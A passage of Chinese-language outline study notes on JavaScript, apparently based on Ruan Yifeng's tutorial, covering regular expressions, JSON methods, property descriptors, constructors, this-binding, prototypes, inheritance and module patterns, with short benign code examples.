除所有字母、数字和下划线以外的字符，相当于[^A-Za-z0-9_]。\r\n\t\t\t- \\s 匹配空格（包括制表符、空格符、断行符等），相等于[\\t\\r\\n\\v\\f]。\r\n\t\t\t- \\S 匹配非空格的字符，相当于[^\\t\\r\\n\\v\\f]。\r\n\t\t\t- \\b 匹配词的边界。\r\n\t\t\t- \\B 匹配非词边界，即在词的内部。\r\n\r\n\t- 重复类\r\n\r\n\t\t- 模式的精确匹配次数，使用大括号（{}）表示。{n}表示恰好重复n次，{n,}表示至少重复n次，{n,m}表示重复不少于n次，不多于m次。\r\n\t- 量词符\r\n\r\n\t\t- 量词符用来设定某个模式出现的次数。\r\n\r\n\t\t\t- ? 问号表示某个模式出现0次或1次，等同于{0, 1}。\r\n\t\t\t- * 星号表示某个模式出现0次或多次，等同于{0,}。\r\n\t\t\t- + 加号表示某个模式出现1次或多次，等同于{1,}。\r\n\r\n\t- 贪婪模式\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- 默认情况下都是最大可能匹配，即匹配直到下一个字符不满足匹配规则为止。这被称为贪婪模式。\r\n\t\t- 如果想将贪婪模式改为非贪婪模式，可以在量词符后面加一个问号。\r\n\r\n\t\t- 除了非贪婪模式的加号，还有非贪婪模式的星号（*）。\r\n\r\n\t\t\t- *?：表示某个模式出现0次或多次，匹配时采用非贪婪模式。\r\n\t\t\t- +?：表示某个模式出现1次或多次，匹配时采用非贪婪模式。\r\n\r\n\t- 修饰符\r\n\r\n\t\t- 修饰符（modifier）表示模式的附加规则，放在正则模式的最尾部。可以单个使用，也可以多个一起使用。\r\n\t\t- （1）g修饰符\r\n\r\n\t\t\t- 默认情况下，第一次匹配成功后，正则对象就停止向下匹配了。g修饰符表示全局匹配（global），加上它以后，正则对象将匹配全部符合条件的结果，主要用于搜索和替换。\r\n\r\n\t\t- （2）i修饰符\r\n\r\n\t\t\t- 默认情况下，正则对象区分字母的大小写，加上i修饰符以后表示忽略大小写（ignorecase）。\r\n\r\n\t\t- （3）m修饰符\r\n\r\n\t\t\t- m修饰符表示多行模式（multiline），会修改^和$的行为。默认情况下（即不加m修饰符时），^和$匹配字符串的开始处和结尾处，加上m修饰符以后，^和$还会匹配行首和行尾，即^和$会识别换行符（\\n）。\r\n\r\n\t- 组匹配\r\n\r\n\t\t- （1）概述\r\n\r\n\t\t\t- \r\n正则表达式的括号表示分组匹配，括号中的模式可以用来匹配分组的内容。\r\n\t\t- 在正则表达式内部，可以用\\n引用括号匹配的内容，n是从1开始的自然数，表示对应顺序的括号。\r\n\t\t- （2）非捕获组\r\n\r\n\t\t\t- (?:x)称为非捕获组（Non-capturing group），表示不返回该组匹配的内容，即匹配的结果中不计入这个括号。\r\n\t\t\t- 非捕获组的作用请考虑这样一个场景，假定需要匹配foo或者foofoo，正则表达式就应该写成/(foo){1, 2}/，但是这样会占用一个组匹配。这时，就可以使用非捕获组，将正则表达式改为/(?:foo){1, 2}/，它的作用与前一个正则是一样的，但是不会单独输出括号内部的内容。\r\n\r\n\t\t- （3）先行断言\r\n\r\n\t\t\t- x(?=y)称为先行断言（Positive look-ahead），x只有在y前面才匹配，y不会被计入返回结果。比如，要匹配后面跟着百分号的数字，可以写成/\\d+(?=%)/。\r\n\r\n\t\t- （4）先行否定断言\r\n\r\n\t\t\t- x(?!y)称为先行否定断言（Negative look-ahead），x只有不在y前面才匹配，y不会被计入返回结果。比如，要匹配后面跟的不是百分号的数字，就要写成/\\d+(?!%)/。\r\n\r\n### JSON对象\r\n\r\n- JSON.stringify()\r\n\r\n\t- 基本用法\r\n\r\n\t\t- JSON.stringify方法用于将一个值转为字符串。该字符串符合 JSON 格式，并且可以被JSON.parse方法还原。\r\n\t\t- 需要注意的是，对于原始类型的字符串，转换结果会带双引号。\r\n\t\t- 如果原始对象中，有一个成员的值是undefined、函数或 XML 对象，这个成员会被过滤。\r\n\t\t- 如果数组的成员是undefined、函数或 XML 对象，则这些值被转成null。\r\n\t\t- 正则对象会被转成空对象。\r\n\r\n\t- 第二个参数\r\n\r\n\t\t- JSON.stringify方法还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。这个类似“白名单”的数组，只对对象的属性有效，对数组无效。\r\n\r\n\t\t- 第二个参数还可以是一个函数，用来更改JSON.stringify的默认行为。\r\n\r\n\t- 第三个参数\r\n\r\n\t\t- JSON.stringify还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。\r\n\r\n\t- toJSON 方法\r\n\r\n\t\t- 如果对象有自定义的toJSON方法，那么JSON.stringify会使用这个方法的返回值作为参数，而忽略原对象的其他属性。\r\n\r\n- JSON.parse()\r\n\r\n\t- JSON.parse方法用于将JSON字符串转化成对象。\r\n\r\n\t- JSON.parse方法可以接受一个处理函数，用法与JSON.stringify方法类似。\r\n\r\n### console对象\r\n\r\n### 属性描述对象\r\n\r\n- 概述\r\n\r\n\t- JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。\r\n\t- 属性描述对象提供6个元属性。\r\n\r\n\t\t- （1）value\r\n\r\n\t\t\t- value是该属性的属性值，默认为undefined。\r\n\r\n\t\t- （2）writable\r\n\r\n\t\t\t- writable是一个布尔值，表示属性值（value）是否可改变（即是否可写），默认为true。\r\n\r\n\t\t- （3）enumerable\r\n\r\n\t\t  具体来说，如果一个属性的enumerable为false，下面三个操作不会取到该属性。\r\n\r\n\t\t  \r\n\r\n\t\t  for..in循环\r\n\r\n\t\t  Object.keys方法\r\n\r\n\t\t  JSON.stringify方法\r\n\r\n\t\t\t- enumerable是一个布尔值，表示该属性是否可遍历，默认为true。如果设为false，会使得某些操作（比如for...in循环、Object.keys()）跳过该属性。\r\n\r\n\t\t- （4）configurable\r\n\r\n\t\t\t- configurable是一个布尔值，表示可配置性，默认为true。如果设为false，将阻止某些操作改写该属性，比如无法删除该属性，也不得改变该属性的属性描述对象（value属性除外）。也就是说，configurable属性控制了属性描述对象的可写性。\r\n\r\n\t\t\t\t- 可配置性决定了目标属性是否可以被删除（delete）。\r\n\r\n\t\t- （5）get\r\n\r\n\t\t\t- get是一个函数，表示该属性的取值函数（getter），默认为undefined。\r\n\r\n\t\t- （6）set\r\n\r\n\t\t\t- set是一个函数，表示该属性的存值函数（setter），默认为undefined。\r\n\r\n- Object.getOwnPropertyDescriptor()\r\n\r\n\t- Object.getOwnPropertyDescriptor方法可以获取属性描述对象。它的第一个参数是一个对象，第二个参数是一个字符串，对应该对象的某个属性名。\r\n\t- 注意，Object.getOwnPropertyDescriptor方法只能用于对象自身的属性，不能用于继承的属性。\r\n\r\n- Object.getOwnPropertyNames()\r\n\r\n\t- Object.getOwnPropertyNames方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。\r\n- Object.defineProperty()，Object.defineProperties()\r\n\r\n\t- Object.defineProperty方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下。\r\n\t- Object.defineProperty方法接受三个参数，依次如下。\r\n\r\n\t\t- 属性所在的对象\r\n\t\t- 属性名（它应该是一个字符串）\r\n\t\t- 属性描述对象\r\n\r\n\t- 如果属性已经存在，Object.defineProperty方法相当于更新该属性的属性描述对象。\r\n\t- 注意，一旦定义了取值函数get（或存值函数set），就不能将writable属性设为true，或者同时定义value属性，否则会报错。\r\n\r\n- Object.prototype.propertyIsEnumerable()\r\n\r\n\t- 实例对象的propertyIsEnumerable方法返回一个布尔值，用来判断某个属性是否可遍历。\r\n- 存取器\r\n\r\n\t- 定义\r\n\r\n\t\t- 除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为setter，使用属性描述对象的set属性；取值函数称为getter，使用属性描述对象的get属性。\r\n\r\n\t- 一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如某个属性禁止赋值。\r\n\r\n\t- JavaScript 还提供了存取器的另一种写法。\r\n\r\n\t- 注意，取值函数get不能接受参数，存值函数set只能接受一个参数（即属性的值）。\r\n\t- 存取器往往用于，属性的值依赖对象内部数据的场合。\r\n\r\n- 对象的拷贝\r\n- 控制对象状态\r\n\r\n\t- 概述\r\n\r\n\t\t- 有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是Object.preventExtensions，其次是Object.seal，最强的是Object.freeze。\r\n\r\n\t- Object.preventExtensions()\r\n\r\n\t\t- Object.preventExtensions方法可以使得一个对象无法再添加新的属性。\r\n\r\n\t\t- Object.isExtensible()\r\n\r\n\t\t\t- Object.isExtensible方法用于检查一个对象是否使用了Object.preventExtensions方法。也就是说，检查是否可以为一个对象添加属性。\r\n\r\n\t- Object.seal()\r\n\r\n\t\t- Object.seal方法使得一个对象既无法添加新属性，也无法删除旧属性。Object.seal只是禁止新增或删除属性，并不影响修改某个属性的值。\r\n\r\n\t\t- Object.isSealed()\r\n\r\n\t\t\t- Object.isSealed方法用于检查一个对象是否使用了Object.seal方法。\r\n\r\n\t- Object.freeze()\r\n\r\n\t\t- Object.freeze方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。\r\n\r\n\t\t- Object.isFrozen()\r\n\r\n\t\t\t- Object.isFrozen方法用于检查一个对象是否使用了Object.freeze方法。\r\n\r\n\t- 局限性\r\n\r\n\t\t- 上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。\r\n\r\n\t\t- 另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。\r\n\r\n## 阮一峰·JS面向对 象编程\r\n\r\n### 构造函数与 new 命令\r\n\r\n- 对象是什么\r\n\r\n\t- （1）对象是单个实物的抽象。\r\n\t- （2）对象是一个容器，封装了属性（property）和方法（method）。\r\n\r\n- 构造函数\r\n\r\n\t- 典型的面向对象编程语言（比如 C++ 和 Java），存在“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。\r\n\t- JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成对象的函数。它提供模板，描述对象的基本结构。一个构造函数，可以生成多个对象，这些对象都有相同的结构。\r\n\t- 构造函数的特点有两个。\r\n\r\n\t\t- 函数体内部使用了this关键字，代表了所要生成的对象实例。\r\n\t\t- 生成对象的时候，必需用new命令，调用Vehicle函数。\r\n\r\n- new 命令\r\n\r\n\t- 基本用法\r\n\r\n\t\t- new命令的作用，就是执行构造函数，返回一个实例对象。\r\n\r\n\t\t\t- new命令执行时，构造函数内部的this，就代表了新生成的实例对象\r\n\r\n\t\t- 使用new命令时，根据需要，构造函数也可以接受参数。\r\n\r\n\t\t- new命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。\r\n\t\t- 如果忘了使用new命令，直接调用构造函数会发生什么事？\r\n\r\n\t\t\t- 这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，this这时代表全局对象，将造成一些意想不到的结果。\r\n\r\n\t\t\t- 解决方法\r\n\r\n\t\t\t\t- 一个解决办法是，在构造函数内部使用严格模式，即第一行加上use strict。\r\n\t\t\t\t- 另一个解决办法，是在构造函数内部判断是否使用new命令，如果发现没有使用，则直接返回一个实例对象。\r\n\r\n\t- new 命令的原理\r\n\r\n\t\t- 概述\r\n\r\n\t\t\t- 使用new命令时，它后面的函数调用就不是正常的调用，而是依次执行下面的步骤。\r\n\t\t\t- （1）创建一个空对象，作为将要返回的对象实例\r\n\t\t\t- （2）将这个空对象的原型，指向构造函数的prototype属性\r\n\t\t\t- （3）将这个空对象赋值给函数内部的this关键字\r\n\t\t\t- （4）开始执行构造函数内部的代码\r\n\r\n\t\t- 原理\r\n\r\n\t\t\t- 构造函数内部，this指的是一个新生成的空对象，所有针对this的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即this对象），将其“构造”为需要的样子。\r\n\r\n\t\t- 构造函数有return的情况\r\n\r\n\t\t\t- 如果构造函数内部有return语句，而且return后面跟着一个对象，new命令会返回return语句指定的对象；否则，就会不管return语句，返回this对象。\r\n\r\n\t\t- 构造函数没有this而使用new来构造的情况\r\n\r\n\t\t\t- 如果对普通函数（内部没有this关键字的函数）使用new命令，则会返回一个空对象。\r\n\r\n\t\t- new命令简化的内部流程\r\n\r\n\t- new.target\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- 函数内部可以使用new.target属性。如果当前函数是new命令调用，new.target指向当前函数，否则为undefined。\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 使用这个属性，可以判断函数调用的时候，是否使用new命令。\r\n\r\n\t- 使用 Object.create() 创建实例对象\r\n\r\n\t\t- 使用Object.create()方法，直接以某个实例对象作为模板，生成一个新的实例对象。\r\n### this 关键字\r\n\r\n- 使用场合\r\n\r\n\t- （1）全局环境\r\n\r\n\t\t- 在全局环境使用this，它指的就是顶层对象window。\r\n\r\n\t- （2）构造函数\r\n\r\n\t\t- 构造函数中的this，指的是实例对象。\r\n\r\n\t- （3）对象的方法\r\n\r\n\t\t- 当 A 对象的方法被赋予 B 对象，该方法中的this就从指向 A 对象变成了指向 B 对象。所以要特别小心，将某个对象的方法赋值给另一个对象，会改变this的指向。\r\n\r\n- 使用注意点\r\n\r\n\t- （1）避免多层 this\r\n\r\n\t\t- 一个解决方法是在第二层改用一个指向外层this的变量。\r\n\r\n\t\t- JavaScript 提供了严格模式，也可以硬性避免这种问题。在严格模式下，如果函数内部的this指向顶层对象，就会报错。\r\n\r\n\t- （2）避免数组处理方法中的this\r\n\r\n\t\t- 数组的map和foreach方法，允许提供一个函数作为参数。这个函数内部不应该使用this。\r\n\r\n\t\t\t- 解决这个问题的一种方法，是使用中间变量。\r\n\r\n\t\t\t- 另一种方法是将this当作foreach方法的第二个参数，固定它的运行环境。\r\n\r\n\t- （3）避免回调函数中的this\r\n\r\n\t\t- 回调函数中的this往往会改变指向，最好避免使用。\r\n\r\n- 绑定 this 的方法\r\n\r\n\t- 概述\r\n\r\n\t\t- JavaScript提供了call、apply、bind这三个方法，来切换/固定this的指向。\r\n\r\n\t- function.prototype.call()\r\n\r\n\t\t- 函数实例的call方法，可以指定函数内部this的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。\r\n\t\t- call方法的参数，应该是一个对象。如果参数为空、null和undefined，则默认传入全局对象。\r\n\r\n\t\t- call的第一个参数就是this所要指向的那个对象，后面的参数则是函数调用时所需的参数。\r\n\t\t- 应用\r\n\r\n\t\t\t- call方法的一个应用是调用对象的原生方法。\r\n\r\n\t- function.prototype.apply()\r\n\r\n\t\t- apply方法的作用与call方法类似，也是改变this指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。func.apply(thisValue, [arg1, arg2, ...])\r\n\t\t- 应用\r\n\r\n\t\t\t- （1）找出数组最大元素\r\n\r\n\t\t\t  var a = [10, 2, 4, 15, 9];\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  Math.max.apply(null, a)\r\n\r\n\t\t\t  // 15\r\n\r\n\t\t\t\t- JavaScript不提供找出数组最大元素的函数。结合使用apply方法和Math.max方法，就可以返回数组的最大元素。\r\n\r\n\t\t\t- （2）将数组的空元素变为undefined\r\n\r\n\t\t\t  Array.apply(null, [\"a\",,\"b\"])\r\n\r\n\t\t\t  // [ 'a', undefined, 'b' ]\r\n\r\n\t\t\t\t- 空元素与undefined的差别在于，数组的forEach方法会跳过空元素，但是不会跳过undefined。因此，遍历内部元素的时候，会得到不同的结果。\r\n\r\n\t\t\t- （3）转换类似数组的对象\r\n\r\n\t\t\t  Array.prototype.slice.apply({0:1,length:1})\r\n\r\n\t\t\t  // [1]\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  Array.prototype.slice.apply({0:1})\r\n\r\n\t\t\t  // []\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  Array.prototype.slice.apply({0:1,length:2})\r\n\r\n\t\t\t  // [1, undefined]\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  Array.prototype.slice.apply({length:1})\r\n\r\n\t\t\t  // [undefined]\r\n\r\n\t\t\t\t- 上面代码的apply方法的参数都是对象，但是返回结果都是数组，这个方法起作用的前提是，被处理的对象必须有length属性，以及相对应的数字键。\r\n\r\n\t\t\t- （4）绑定回调函数的对象\r\n\r\n\t\t\t  var o = new Object();\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  o.f = function () {\r\n\r\n\t\t\t    console.log(this === o);\r\n\r\n\t\t\t  }\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  var f = function (){\r\n\r\n\t\t\t    o.f.apply(o);\r\n\r\n\t\t\t    // 或者 o.f.call(o);\r\n\r\n\t\t\t  };\r\n\r\n\t\t\t  \r\n\r\n\t\t\t  $('#button').on('click', f);\r\n\r\n\t- function.prototype.bind()\r\n\r\n\t\t- 概述\r\n\r\n\t\t\t- bind方法用于将函数体内的this绑定到某个对象，然后返回一个新函数。\r\n\r\n\t\t- bind比call方法和apply方法更进一步的是，除了绑定this以外，还可以绑定原函数的参数。\r\n\r\n\t\t- 如果bind方法的第一个参数是null或undefined，等于将this绑定到全局对象，函数运行时this指向顶层对象（在浏览器中为window）。\r\n\t\t- bind方法有一些使用注意点。\r\n\r\n\t\t\t- （1）每一次返回一个新函数\r\n\r\n\t\t\t\t- 监听事件的时候，不能写成下面这样。element.addEventListener('click', o.m.bind(o));\r\nclick事件绑定bind方法生成的一个匿名函数。这样会导致无法取消绑定\r\n\t\t\t\t- 正确的方法是写成下面这样：\r\n\r\n\t\t\t\t\t- var listener = o.m.bind(o);\r\nelement.addEventListener('click', listener);\r\n//  ...\r\nelement.removeEventListener('click', listener);\r\n\r\n\t\t\t- （2）结合回调函数使用\r\n\r\n\t\t\t\t- 回调函数是JavaScript最常用的模式之一，但是一个常见的错误是，将包含this的方法直接当作回调函数。\r\n\t\t\t\t- 还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的this指向，很可能也会出错。\r\n\r\n\t\t\t- （3）结合call方法使用\r\n\r\n\t\t\t\t- 利用bind方法，可以改写一些JavaScript原生方法的使用形式，以数组的slice方法为例。\r\n\r\n\t\t\t- （4）与call，apply的区别\r\n\r\n\t\t\t\t- call和apply都是改变上下文中的this并立即执行这个函数，bind方法可以让对应的函数想什么时候调就什么时候调用，并且可以将参数在执行的时候添加，这是它们的区别\r\n\r\n### prototype 对象\r\n\r\n- 概述\r\n\r\n\t- 通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。\r\n\r\n- prototype 属性的作用\r\n\r\n\t- JavaScript 的每个对象都继承另一个对象，后者称为“原型”（prototype）对象\r\n\t- 原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上。\r\n\r\n\t\t- 当实例对象本身没有某个属性或方法的时候，它会到构造函数的prototype属性指向的对象，去寻找该属性或方法。这就是原型对象的特殊之处。\r\n\t\t- 如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。\r\n\r\n\t- 总结\r\n\r\n\t\t- 原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。\r\n\r\n- 原型链\r\n\r\n\t- 原型链的作用\r\n\r\n\t\t- “原型链”的作用是，读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的Object.prototype还是找不到，则返回undefined。\r\n\r\n\t- 对于性能的影响\r\n\r\n\t\t- 需要注意的是，一级级向上，在原型链寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。\r\n\r\n\t- 举例\r\n\r\n\t\t- 如果让某个函数的prototype属性指向一个数组，就意味着该函数可以当作数组的构造函数，因为它生成的实例对象都可以通过prototype属性调用数组方法。\r\n\r\n- constructor 属性\r\n\r\n\t- prototype对象有一个constructor属性，默认指向prototype对象所在的构造函数。\r\n\r\n\t- 由于constructor属性定义在prototype对象上面，意味着可以被所有实例对象继承。\r\n\t- 作用\r\n\r\n\t\t- constructor属性的作用，是分辨原型对象到底属于哪个构造函数。\r\n\r\n\t- 应用\r\n\r\n\t\t- 有了constructor属性，就可以从实例新建另一个实例。\r\n\r\n\t\t- 这使得在实例方法中，调用自身的构造函数成为可能。\r\n\r\n\t\t\t- Constr.prototype.createCopy = function () {\r\n  return new this.constructor();\r\n};\r\n\r\n\t- 注意\r\n\r\n\t\t- 修改原型对象时，一般要同时校正constructor属性的指向。\r\n\r\n- instanceof 运算符\r\n\r\n\t- instanceof运算符返回一个布尔值，表示某个对象是否为指定的构造函数的实例。\r\n\r\n\t- 它会检查右边构建函数的原型对象（prototype），是否在左边对象的原型链上。\r\n\r\n\t- 由于instanceof对整个原型链上的对象都有效，因此同一个实例对象，可能会对多个构造函数都返回true。\r\n\r\n\t- 注意\r\n\r\n\t\t- instanceof运算符在判断类型的值时只能用于对象，不适用原始类型的值。\r\n\t\t- 对于undefined和null，instanceOf运算符总是返回false。\r\n\r\n- Object.getPrototypeOf()\r\n\r\n\t- Object.getPrototypeOf方法返回一个对象的原型。这是获取原型对象的标准方法。\r\n\r\n- Object.setPrototypeOf()\r\n\r\n\t- Object.setPrototypeOf方法可以为现有对象设置原型，返回一个新对象。\r\n\t- Object.setPrototypeOf方法接受两个参数，第一个是现有对象，第二个是原型对象。\r\n\r\n- Object.create()\r\n\r\n\t- 由来\r\n\r\n\t\t- 生成实例对象的常用方法，就是使用new命令，让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？\r\n\r\n\t- 概述\r\n\r\n\t\t- JavaScript 提供了Object.create方法，用来满足这种需求。该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。该实例完全继承原型对象的属性。\r\n\r\n\t- 手动实现Object.create()\r\n\r\n\t\t\t- Object.create方法的实质是新建一个构造函数F，然后让F.prototype属性指向参数对象obj，最后返回一个F的实例，从而实现让该实例继承obj的属性。\r\n\r\n\t- 注意\r\n\r\n\t\t- 如果想要生成一个不继承任何属性（比如没有toString和valueOf方法）的对象，可以将Object.create的参数设为null。\r\n\r\n\t\t- 使用Object.create方法的时候，必须提供对象原型，即参数不能为空，或者不是对象，否则会报错。\r\n\t\t- Object.create方法生成的对象，继承了它的原型对象的构造函数。\r\n\r\n- Object.prototype.isPrototypeOf()\r\n\r\n\t- 对象实例的isPrototypeOf方法，用来判断一个对象是否是另一个对象的原型。\r\n\r\n\t- 只要某个对象处在原型链上，isPrototypeOf都返回true。\r\n\r\n- Object.prototype.__proto__\r\n\r\n\t- 概述\r\n\r\n\t\t- __proto__属性（前后各两个下划线）可以改写某个对象的原型对象。\r\n\r\n\t- 注意事项\r\n\r\n\t\t- 根据语言标准，__proto__属性只有浏览器才需要部署，其他环境可以没有这个属性，而且前后的两根下划线，表示它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用Object.getPrototypeof()（读取）和Object.setPrototypeOf()（设置），进行原型对象的读写操作。\r\n\r\n- 获取原型对象方法的比较\r\n\r\n\t- 获取实例对象obj的原型对象，有三种方法。\r\n\r\n\t\t- obj.__proto__\r\n\t\t- obj.constructor.prototype\r\n\t\t- Object.getPrototypeOf(obj)\r\n\r\n\t- 上面三种方法之中，前两种都不是很可靠。最新的ES6标准规定，__proto__属性只有浏览器才需要部署，其他环境可以不部署。而obj.constructor.prototype在手动改变原型对象时，可能会失效。\r\n\t- 推荐使用第三种Object.getPrototypeOf方法，获取原型对象。\r\n\r\n### Object 对象与继承\r\n\r\n- Object.getOwnPropertyNames()\r\n\r\n\t- 定义\r\n\r\n\t\t- Object.getOwnPropertyNames方法返回一个数组，成员是对象本身的所有属性的键名，不包含继承的属性键名。\r\n\r\n\t- 与Object.keys()对比\r\n\r\n\t\t- 对象本身的属性之中，有的是可以枚举的（enumerable），有的是不可以枚举的，Object.getOwnPropertyNames方法返回所有键名。只获取那些可以枚举的属性，使用Object.keys方法。\r\n\r\n- Object.prototype.hasOwnProperty()\r\n\r\n\t- 定义\r\n\r\n\t\t- 对象实例的hasOwnProperty方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。\r\n\r\n\t- 特点\r\n\r\n\t\t- hasOwnProperty方法是JavaScript之中唯一一个处理对象属性时，不会遍历原型链的方法。\r\n\r\n- 对象的拷贝\r\n\r\n\t- 初步认识\r\n\r\n\t\t- 如果要拷贝一个对象，需要做到下面两件事情。\r\n\r\n\t\t\t- 确保拷贝后的对象，与原对象具有同样的prototype原型对象。\r\n\t\t\t- 确保拷贝后的对象，与原对象具有同样的属性。\r\n\r\n\t- ES5版本\r\n\r\n\t  function copyObject(orig) {\r\n\r\n\t  -  var copy = Object.create(Object.getPrototypeOf(orig));\r\n\r\n\t   -  copyOwnPropertiesFrom(copy, orig);\r\n\r\n\t   -  return copy;\r\n\r\n\t  }\r\n\r\n\t  \r\n\r\n\t  function copyOwnPropertiesFrom(target, source) {\r\n\r\n\t    Object\r\n\r\n\t    .getOwnPropertyNames(source)\r\n\r\n\t    .forEach(function(propKey) {\r\n\r\n\t      var desc = Object.getOwnPropertyDescriptor(source, propKey);\r\n\r\n\t      Object.defineProperty(target, propKey, desc);\r\n\r\n\t    });\r\n\r\n\t    return target;\r\n\r\n\t  }\r\n\r\n\t- 另一种更简单的写法，是利用 ES2017 才引入标准的Object.getOwnPropertyDescriptors方法。\r\n\r\n\t  function copyObject(orig) {\r\n\r\n\t    return Object.create(\r\n\r\n\t      Object.getPrototypeOf(orig),\r\n\r\n\t      Object.getOwnPropertyDescriptors(orig)\r\n\r\n\t    );\r\n\r\n\t  }\r\n\r\n### 面向对象编程的模式\r\n\r\n- 构造函数的继承（注意是构造函数之间的继承，和构造函数通过new关键字生成实例是不一样的）\r\n\r\n\t- 写法一：让一个构造函数继承另一个构造函数，是非常常见的需求。这可以分成两步实现。\r\n\r\n\t\t- 第一步是在子类的构造函数中，调用父类的构造函数。（注意没有new，相当于普通函数，借用了他的属性而已，这一步相当于拷贝了父构造函数的属性且this为子构造函数下的this）\r\n\r\n\t\t\t\t- 第一步为复制属性\r\n\r\n\t\t- 第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型（使用creat是为了不让子构造函数的原型对象影响到父构造函数的原型对象，后两行是指定修改子构造函数为其实例的构造函数，修改原型对象时，一般要同时校正constructor属性的指向。以及自定义方法）\r\n\r\n\t\t\t\t- 第二步为继承父构造函数原型对象上的方法\r\n\r\n\t- 写法二：直接让Sub.prototype等于一个父类实例。\r\n\r\n\t\t- Sub.prototype = new Super();\r\n\t\t- 上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以不推荐使用这种写法。\r\n\r\n\t- 举例说明\r\n\r\n\t\t- 整体继承\r\n\r\n\t\t- 单个方法的继承\r\n\r\n- 多重继承（Mixin混入）\r\n\r\n\t- 概述\r\n\r\n\t\t- JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。\r\n\t\t- Object.assign({},obj,obj1);\r\n\r\n\t\t\t- 花括号叫目标对象，后面的obj、obj1是源对象。对象合并是指：将源对象里面的属性添加到目标对象中去，若两者的属性名有冲突，后面的将会覆盖前面的\r\n\r\n\t- 实例\r\n\r\n\t\t\t- 子类S同时继承了父类M1和M2。这种模式又称为 Mixin（混入）。\r\n\r\n- 模块\r\n\r\n\t- 基本的实现方法\r\n\r\n\t\t- 概述\r\n\r\n\t\t\t- 模块是实现特定功能的一组属性和方法的封装。\r\n\r\n\t\t- 可以把模块写成一个对象，所有的模块成员都放到这个对象里面。\r\n\r\n\t\t\t- 上面的函数m1和m2，都封装在module1对象里。使用的时候，就是调用这个对象的属性。\r\n\r\n\t\t\t\t- module1.m1();\r\n\r\n\t\t\t- 但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。\r\n\r\n\t\t\t\t- module1._count = 5;\r\n\r\n\t- 封装私有变量：构造函数的写法\r\n\r\n\t\t- 可以利用构造函数，封装私有变量。\r\n\r\n\t\t\t- 这种方法将私有变量封装在构造函数中，违反了构造函数与实例对象相分离的原则。并且，非常耗费内存。\r\n\t\t\t- 这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。\r\n\r\n\t- 封装私有变量：立即执行函数的写法\r\n\r\n\t\t- 使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。\r\n\r\n\t\t\t- 使用上面的写法，外部代码无法读取内部的_count变量。\r\n\r\n\t- 模块的扩展模式\r\n\r\n\t\t- 如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。\r\n\r\n\t\t\t- 上面的代码为module1模块添加了一个新方法m3()，然后返回新的module1模块。\r\n\r\n\t\t- 在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用”宽扩展模式”（Loose augmentation）。\r\n\r\n\t\t\t- 